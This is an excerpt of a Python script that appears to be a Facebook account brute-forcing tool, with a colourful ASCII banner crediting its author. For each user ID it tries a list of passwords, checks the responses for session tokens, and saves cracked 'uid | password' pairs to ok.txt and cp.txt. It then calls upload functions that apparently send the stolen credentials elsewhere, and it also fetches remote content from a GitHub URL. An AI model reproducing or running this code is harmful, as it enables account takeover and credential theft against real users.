...
def helpnote():
	...
	subprocess.check_output(["am", "start", "https://www.facebook.com/ariyan.raja.56"])
	exit(" [*] FACEBOOK :  https://www.facebook.com/ariyan.raja.56")
...
class Main:
	def __init__(self):
		...
		self.loop = 0
		try:
			khamba= requests.get('https://raw.githubusercontent.com/Adriyan404/Kay/main/Kuy').text
...
\033[1;93m  /_\   __| |_ __(_)_   _  __ _ _ __  
\033[1;94m //_\\ / _` | '__| | | | |/ _` | '_ \ 
\033[1;95m/  _  \ (_| | |  | | |_| | (_| | | | |
\033[1;96m\_/ \_/\__,_|_|  |_|\__, |\__,_|_| |_|
 \033[1;97m                   |___/


\033[1;92m╔═════════════════════════════════════════╗ 
\033[1;92m║ [âˆš] \033[1;92mDEVOLPER    :    KING. ADRIYAN   ║
\033[1;92m║ [âˆš] \033[1;92mFACEBOOK    :    KING.ADRIYAN    ║
\033[1;92m║ [âˆš] \033[1;92mGITHUB      :    Adriyan404      ║
...
\033[1;92m╚═════════════════════════════════════════╝   """)
	...
	def api(self, uid, pwx):
		...
		sys.stdout.write(
			"\r\r %s\033[0;92m[ADRIYAN🕊️]  \033[0;92m%s/%s  \033[0;92m[OK:%s] \033[0;92m[CP:%s] "%(B,self.loop, len(self.id), len(self.ok), len(self.cp))
		); sys.stdout.flush()
		for pw in pwx:
			pw = pw.lower()
			...
			if "session_key" in response.text and "EAAAB" in response.text:
				print("\r \033[0;92m[ADRIYAN-OK🕊️] %s | %s\033[0;92m"%                 (uid, pw))
				self.ok.append("%s | %s"%(uid, pw))
				open("ok.txt","a").write("[ADRIYAN-OK🕊️] %s | %s\n"%(uid, pw))
				uploadoks()
				break
			elif "www.facebook.com" in response.json()["error_msg"]:
				print("\r \033[0;92m[ADRIYAN-OK🕊️] %s | %s\033[0;92m"%                 (uid, pw))
				self.cp.append("%s | %s"%(uid, pw))
				open("cp.txt","a").write("[ADRIYAN-OK🕊️] %s | %s\n"%(uid, pw))
				uploadcps()
				break
			else:
				continue
